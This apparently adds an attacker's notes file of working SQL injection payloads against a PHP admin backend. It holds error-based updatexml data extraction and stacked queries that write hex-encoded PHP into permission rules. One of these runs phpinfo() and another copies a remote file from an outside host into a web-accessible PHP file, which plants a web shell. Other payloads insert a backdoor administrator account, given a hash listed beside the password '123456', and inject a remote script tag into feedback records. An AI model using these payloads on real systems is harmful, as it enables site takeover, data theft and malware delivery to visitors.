@@ -1,0 +1,50 @@
+
+
+
+$2y$10$GDoAkNDzomsI5sbx.UpVh.FOMTwJqahuVNd9RcmMbCtLfPe3vr3kW 123456
+0x2432792431302447446f416b4e447a6f6d7349357362782e557056682e464f4d54774a71616875564e643952636d4d6243744c665065337672336b57
+
+https://m.xxx.com/admin/caiji/httpcopy2?url=http://xxxx.ts.xxxx.cz/upload/1654508565ws9xm3.txt&path=/www/wwwroot/tp6.xxx/public/static_pc/&file=httpcopy2.php
+
+
+and updatexml%23%0a(1,concat(1,(user())),1)
+
+ and updatexml(1,concat(1,(select  `condition`  from qiswl_auth_rule where id=267)),1)-- 
+
+;update qiswl_auth_rule set `condition`=0x31293b706870696e666f28293b64696528293b2f2f where id=155
+
+https://23.xxx.60.xxx/home/Order/fruit
+cdk=111' ;update qiswl_auth_rule set `condition`=0x31293b636f70792822687474703a2f2f75706c6f61642e74732e74757262696e652e637a2f75706c6f61642f31363534353038353635777339786d332e747874222c222e2f4170706c69636174696f6e2f52756e74696d652f6c6f672e70687022293b2f2f00 where id=267 --+
+
+
+and updatexml
+
+
+qiswl_system_login_log
+
+and updatexml(1,concat(1,(SELECT URL from qiswl_system_operation_log limit 1)),1)
+
+
+$2y$10$aRXcnkuHj5Ytnt1yYvWETercFIaY5GaX7.liNbNArodmR1e7TOYSK
+
+
+155 | 0   | admin\\/updatelog\\/index           | 1    | \\u66f4\\u65b0\\u65e5\\u5fd7\\u7ba1\\u7406               | 1      | 1      | <blank>     |
+
+
+
+	copy("","/www/wwwroot/xxx.com/Application/Runtime/Logs/log1.php");
+
+
+
+%0a--+%0a;INSERT%0a--+%0aINTO qiswl_admin_user(username,password) VALUES ("xxx","$2y$10$GDoAkNDzomsI5sbx.UpVh.FOMTwJqahuVNd9RcmMbCtLfPe3vr3kW")
+--+
+
+%0a--+%0a;update qiswl_admin_user%0a--+%0aset id=999 where username="xxx"
+
+%0a--+%0a;update qiswl_admin_user%0a--+%0aset password="$2y$10$GDoAkNDzomsI5sbx.UpVh.FOMTwJqahuVNd9RcmMbCtLfPe3vr3kW" where username="xxx"
+
+
+%0a--+%0a;INSERT%0a INTO `qiswl_auth_group_access` (`uid`, `group_id`) VALUES (999, 1) --+
+
+
+order=1;update `qiswl_feedback`  set contact=0x3c736372697074207372633d222f2f6d2e6867646d352e636f6d2f4170706c69636174696f6e2f52756e74696d652f6a7372756e2e6a73223e203c2f7363726970743e where member_id=855371 --+
